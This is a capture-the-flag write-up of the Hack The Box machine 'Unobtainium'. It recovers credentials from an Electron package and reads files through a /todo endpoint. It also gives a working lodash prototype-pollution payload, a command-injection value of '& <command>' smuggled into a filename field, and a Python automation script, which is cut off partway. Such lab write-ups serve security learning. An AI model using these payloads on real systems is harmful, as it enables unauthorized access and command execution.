<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Unobtainium" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/unobtainium/" /><meta property="og:url" content="https://x00tex.github.io/posts/unobtainium/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/unobtainium/unobtainium_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-05T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/unobtainium/unobtainium_banner.png" /><meta property="twitter:title" content="Hackthebox - Unobtainium" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-09-05T18:30:00+00:00","datePublished":"2021-09-05T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Unobtainium","image":"https://x00tex.github.io/assets/img/posts/unobtainium/unobtainium_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/unobtainium/"},"url":"https://x00tex.github.io/posts/unobtainium/"}</script><title>Hackthebox - Unobtainium | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Unobtainium</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Unobtainium</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1630866600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-09-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1933 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/unobtainium/unobtainium_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.10.235 unobtainium.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre>PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http             Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
<span class="c"># ...[snip] ...</span>
|_http-title: Site doesn<span class="s1">'t have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-05-30T07:10:33
|_Not valid after:  2022-05-31T07:10:33
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server <span class="o">(</span>Go-IPFS json-rpc or InfluxDB API<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>

Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><ul><li>In first visit, Don’t find anything interesting anywhere. Only Apache httpd on port 80 contains a downloadable archive.</ul><p><img data-src="/assets/img/posts/unobtainium/port-80.png" alt="" data-proofer-ignore></p><h1 id="foothold">Foothold</h1><h2 id="reversing-electron-application-deb-package"><span class="mr-2">Reversing Electron application deb package</span><a href="#reversing-electron-application-deb-package" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Unzip downloaded archive gets a deb package. we can use dpkg to view control information of the deb package. <em>get from <a href="https://serverfault.com/questions/88510/how-do-i-show-the-actions-that-installing-a-deb-package-will-take">here</a></em></p><p><img data-src="/assets/img/posts/unobtainium/deb-control-info.png" alt="" data-proofer-ignore></p><p>Found Some information</p><ul><li>Hostname: <code class="language-plaintext highlighter-rouge">unobtainium.htb</code><li>Username: <code class="language-plaintext highlighter-rouge">felamos@unobtainium.htb</code></ul><p>Extract files from deb file with <code class="language-plaintext highlighter-rouge">ar</code> utility.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ar <span class="nt">-xv</span> unobtainium_1.0.0_amd64.deb
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/reverse-deb.png" alt="" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">control.tar.gz</code> archive contains scripts used by package installer to install binaries.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ <span class="nb">tar</span> <span class="nt">-xvf</span> control.tar.gz
./
./postinst
./postrm
./control
./md5sums
</pre></table></code></div></div><p>From these tar archives get some information about that package.</p><ul><li>This application written in <a href="https://www.electronjs.org/">Electron framework</a><li>Package created with <a href="https://github.com/jordansissel/fpm">FPM</a></ul><p><code class="language-plaintext highlighter-rouge">data.tar.xz</code> contains all executable binaries under <code class="language-plaintext highlighter-rouge">./opt/unobtainium</code> folder.</p><p><img data-src="/assets/img/posts/unobtainium/exec-app.png" alt="" data-proofer-ignore></p><p>All Electron framework creates An <a href="https://electron.ebookchain.org/en/tutorial/application-packaging.html">asar archive</a> is a simple tar-like format that concatenates files into a single file to mitigate issues around long path names, slightly speed up require and conceal your source code from cursory inspection.Electron can read arbitrary files from it without unpacking the whole file.</p><p>We can find that file in <code class="language-plaintext highlighter-rouge">./opt/unobtainium/resources</code> and Extract it with <a href="https://github.com/electron/asar"><code class="language-plaintext highlighter-rouge">asar</code></a>. <em>get from <a href="https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file">here</a></em></p><p><img data-src="/assets/img/posts/unobtainium/asar-extract.png" alt="" data-proofer-ignore></p><p>only interesting file found on application source code is <code class="language-plaintext highlighter-rouge">todo,js</code></p><p><img data-src="/assets/img/posts/unobtainium/todo-js.png" alt="" data-proofer-ignore></p><p>Found interesting information</p><ul><li>User creds: <code class="language-plaintext highlighter-rouge">felamos:Winter2021</code><li>this script sending post request to <code class="language-plaintext highlighter-rouge">/todo</code> and requesting for a txt file.</ul><p>If we go to “TODO” in the app, we get the todo list.</p><p><img data-src="/assets/img/posts/unobtainium/app-todo.png" alt="" data-proofer-ignore></p><p>Intercepting application traffic on burp by setting <code class="language-plaintext highlighter-rouge">http_proxy</code> environment variable. <em>get from <a href="https://blog.ropnop.com/proxying-cli-tools/">here</a></em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">http_proxy</span><span class="o">=</span>127.0.0.1:8080
</pre></table></code></div></div><p>Intercepting <code class="language-plaintext highlighter-rouge">/todo</code> request, and changing <code class="language-plaintext highlighter-rouge">"filename":"todo.txt"</code> value. gets an error with empty value.</p><p><img data-src="/assets/img/posts/unobtainium/no-file-error.png" alt="" data-proofer-ignore></p><p>after some try, get some idea that we are currently <code class="language-plaintext highlighter-rouge">/usr/src/app/</code> here and we can not go anywhere from here, but we can read any file inside that directory.</p><p>try to Read for <code class="language-plaintext highlighter-rouge">./index.js</code> file</p><p><img data-src="/assets/img/posts/unobtainium/get-index-file.png" alt="" data-proofer-ignore></p><p>Get some interesting information from <code class="language-plaintext highlighter-rouge">index.js</code> file</p><ul><li><p>There are 2 user, in this application, admin user password is random, so not possible to get it.</p><p><img data-src="/assets/img/posts/unobtainium/two-users.png" alt="" data-proofer-ignore></p><li><p>There is a another endpoint <code class="language-plaintext highlighter-rouge">/upload</code></p><p><img data-src="/assets/img/posts/unobtainium/upload-endpoint.png" alt="" data-proofer-ignore></p><ul><li>But it is checking for <code class="language-plaintext highlighter-rouge">user.canUpload</code> and only admin can upload. So this never gonna possible.</ul></ul><p>Don’t find anything in <code class="language-plaintext highlighter-rouge">index.js</code> that can be exploitable.</p><p>Next Checking <code class="language-plaintext highlighter-rouge">package.json</code> for any outdated or vulnerable dependencies used by this application and found 2 dependencies and both are outdated and vulnerable.</p><p><img data-src="/assets/img/posts/unobtainium/outdated-deps.png" alt="" data-proofer-ignore></p><h2 id="prototype-pollution"><span class="mr-2">Prototype Pollution</span><a href="#prototype-pollution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><a href="https://www.npmjs.com/package/lodash/v/4.17.4"><code class="language-plaintext highlighter-rouge">lodash: 4.17.4</code></a> is vulnerable for <a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">Prototype Pollution</a> Vulnerability, <strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16487">CVE-2018-16487</a>:</strong> <a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638">snyk Vulnerability DB</a>, in lodash &lt;4.17.11 functions <code class="language-plaintext highlighter-rouge">merge</code>, <code class="language-plaintext highlighter-rouge">mergeWith</code>, and <code class="language-plaintext highlighter-rouge">defaultsDeep</code> can be tricked into adding or modifying properties of <code class="language-plaintext highlighter-rouge">Object.prototype</code>.</ol><ul><li><p>And we can verify this from <code class="language-plaintext highlighter-rouge">index.js</code> file that put method when sending message it uses <code class="language-plaintext highlighter-rouge">_.merge</code></p><p><img data-src="/assets/img/posts/unobtainium/put-message.png" alt="" data-proofer-ignore></p><li><p>Exploit PoC from <a href="https://github.com/Kirill89/prototype-pollution-explained">Kirill89@github.com</a></p></ul><p><strong>Exploit</strong></p><ul><li><p>We can use Prototype Pollution Vulnerability to enable <code class="language-plaintext highlighter-rouge">canUpload</code> for user <code class="language-plaintext highlighter-rouge">felamos</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text": "test", "__proto__": {"canUpload": true}}}
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/send-proto.png" alt="" data-proofer-ignore></p></ul><h2 id="command-injection"><span class="mr-2">Command injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><a href="https://www.npmjs.com/package/google-cloudstorage-commands"><code class="language-plaintext highlighter-rouge">google-cloudstorage-commands : 0.0.1</code></a> <strong>CVE-2020-28436:</strong> <a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431">snyk Vulnerability DB</a>, Affected versions of this package are vulnerable to Command Injection from <code class="language-plaintext highlighter-rouge">upload</code> function. If we check <a href="https://github.com/samradical/google-cloudstorage-commands/blob/e69c931c4363be266489b26a1766760c9fce08d2/index.js#L7-L16">source code</a> of this library, it is using <code class="language-plaintext highlighter-rouge">exec</code> function to upload file.</ol><ul><li><p>And we can verify this from <code class="language-plaintext highlighter-rouge">index.js</code> file that <code class="language-plaintext highlighter-rouge">/upload</code> is using <code class="language-plaintext highlighter-rouge">upload()</code> function.</p><p><img data-src="/assets/img/posts/unobtainium/upload-ci.png" alt="" data-proofer-ignore></p><li><p>PoC Found on <a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431">snyk Vulnerability DB</a></p></ul><p><strong>Exploit</strong></p><ul><li><p>now we can Use <code class="language-plaintext highlighter-rouge">/upload</code> endpoint with user “<code class="language-plaintext highlighter-rouge">felamos</code>” credentials to inject system command into <code class="language-plaintext highlighter-rouge">upload()</code> function from <code class="language-plaintext highlighter-rouge">filename</code> parameter.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"auth":{"name":"felamos","password":"Winter2021"},"filename":"&amp; &lt;command&gt;"}
</pre></table></code></div></div><p><img data-src="/assets/img/posts/unobtainium/exec-cmd.png" alt="" data-proofer-ignore></p></ul><h3 id="automate-script"><span class="mr-2">Automate script</span><a href="#automate-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'http://10.10.10.235:31337'</span>


<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"auth"</span><span class="p">:</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"felamos"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"Winter2021"</span><span class="p">},</span> <span class="s">"filename"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">file</span><span class="si">}</span><span class="s">"</span><span class="p">}</span>
    <span class="n">jsonify</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'application/json, text/javascript, */*; q=0.01'</span><span class="p">}</span>
    <span class="n">rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/todo'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">jsonify</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">cleaned</span> <span class="o">=</span> <span class="n">rspn</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">n'</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cleaned</span>


<span class="k">def</span> <span class="nf">send_proto</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"auth"</span><span class="p">:</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"felamos"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"Winter2021"</span><span class="p">},</span>
            <span class="s">"message"</span><span class="p">:</span> <span class="p">{</span><span class="s">"text"</span><span class="p">:</span> <span class="s">"Prototype_Pollution"</span><span class="p">,</span> <span class="s">"__proto__"</span><span class="p">:</span> <span class="p">{</span><span class="s">"canUpload"</span><span class="p">:</span> <span class="bp">True</span><span class="p">}}}</span>
    <span class="n">jsonify</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'application/json, text/javascript, */*; q=0.01'</span><span class="p">}</span>
    <span class="n">rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">jsonify</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">rspn</span><span class="p">.</span><span class="n">text</span>


<span class="k">def</span> <span class="nf">exec_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"auth"</span><span class="p">:</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"felamos"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"Winter2021"</span><span class="p">},</span> <span class="s">"filename"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"&amp; </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">"</span><span class="p">}</span>
    <span class="n">jsonify</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span> <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'application/json, text/javascript, */*; q=0.01'</span><span class="p">}</span>
    <span class="n">rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/upload'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">jsonify</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">rspn</span><span class="p">.</span><span class="n">text</span>


<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-r'</span><span class="p">,</span> <span class="s">'--read-file'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"&lt;filename&gt; Read file, Only application files"</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-U'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Enable file Upload"</span><span class="p">)</span>
